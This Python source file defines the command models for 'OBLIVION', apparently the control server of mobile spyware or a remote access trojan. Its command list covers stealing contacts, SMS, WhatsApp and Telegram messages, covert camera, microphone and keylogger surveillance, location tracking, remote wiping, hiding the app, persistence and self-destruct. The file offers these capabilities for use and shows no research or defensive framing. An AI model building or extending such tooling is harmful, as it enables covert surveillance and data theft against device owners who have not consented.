# ============================================
# OBLIVION - Command Model
# ============================================

from pydantic import BaseModel, Field
from typing import Optional, Dict, Any, List
from datetime import datetime

class CommandBase(BaseModel):
    """Base command model"""
    device_id: str
    command_type: str
    parameters: Optional[Dict[str, Any]] = {}
    priority: Optional[int] = 0
    status: Optional[str] = "pending"

class CommandCreate(CommandBase):
    """Model for creating a command"""
    pass

class CommandUpdate(BaseModel):
    """Model for updating a command"""
    status: Optional[str] = None
    result: Optional[Dict[str, Any]] = None
    error: Optional[str] = None

class CommandModel(CommandBase):
    """Full command model with timestamps"""
    id: int
    created_at: Optional[str] = None
    executed_at: Optional[str] = None
    result: Optional[Dict[str, Any]] = None
    error: Optional[str] = None
    
    class Config:
        from_attributes = True

# Command types constants
class CommandType:
    """Available command types"""
    # Data Extraction
    GET_CONTACTS = "get_contacts"
    GET_SMS = "get_sms"
    GET_CALLS = "get_calls"
    GET_PHOTOS = "get_photos"
    GET_FILES = "get_files"
    GET_BROWSER = "get_browser"
    GET_WHATSAPP = "get_whatsapp"
    GET_TELEGRAM = "get_telegram"
    GET_ALL_DATA = "get_all_data"
    
    # Surveillance
    GET_LOCATION = "get_location"
    START_LOCATION = "start_location"
    STOP_LOCATION = "stop_location"
    TAKE_PHOTO = "take_photo"
    START_CAMERA = "start_camera"
    STOP_CAMERA = "stop_camera"
    START_MIC = "start_mic"
    STOP_MIC = "stop_mic"
    START_KEYLOGGER = "start_keylogger"
    STOP_KEYLOGGER = "stop_keylogger"
    SCREEN_CAPTURE = "screen_capture"
    START_SCREEN_RECORD = "start_screen_record"
    STOP_SCREEN_RECORD = "stop_screen_record"
    
    # Device Control
    UNLOCK_DEVICE = "unlock_device"
    LOCK_DEVICE = "lock_device"
    MAKE_CALL = "make_call"
    SEND_SMS = "send_sms"
    INSTALL_APP = "install_app"
    UNINSTALL_APP = "uninstall_app"
    REBOOT_DEVICE = "reboot_device"
    FACTORY_RESET = "factory_reset"
    WIPE_DATA = "wipe_data"
    
    # Stealth
    SELF_DESTRUCT = "self_destruct"
    HIDE_APP = "hide_app"
    SHOW_APP = "show_app"
    ENABLE_PERSISTENCE = "enable_persistence"
    DISABLE_PERSISTENCE = "disable_persistence"
    
    # System
    GET_INFO = "get_info"
    GET_STATUS = "get_status"
    HEARTBEAT = "heartbeat"
    REGISTER = "register"